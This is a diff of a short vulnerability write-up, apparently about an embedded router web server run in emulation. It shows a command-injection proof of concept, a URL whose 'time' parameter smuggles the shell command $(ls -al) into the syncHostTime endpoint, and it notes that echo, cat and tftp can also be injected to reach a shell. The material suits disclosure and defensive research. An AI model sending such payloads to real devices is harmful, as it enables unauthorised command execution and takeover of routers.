@@ -40,7 +40,9 @@ run ./bin/httpd
 
 ## browser access
 http://192.168.1.140/goform/syncHostTime/js/libs/reasy-ui-1.0.3.js?time=$(ls%20-al)
+
 you can see it in the simulation terminal
+
 ![image](https://github.com/user-attachments/assets/725fa838-9d72-4f69-a5a9-9c2b105b3754)
 
 After testing, not only can execute 'ls'. Can also execute 'echo', 'cat', 'tftp' and other commands that can be used to construct payloads to obtain shell commands
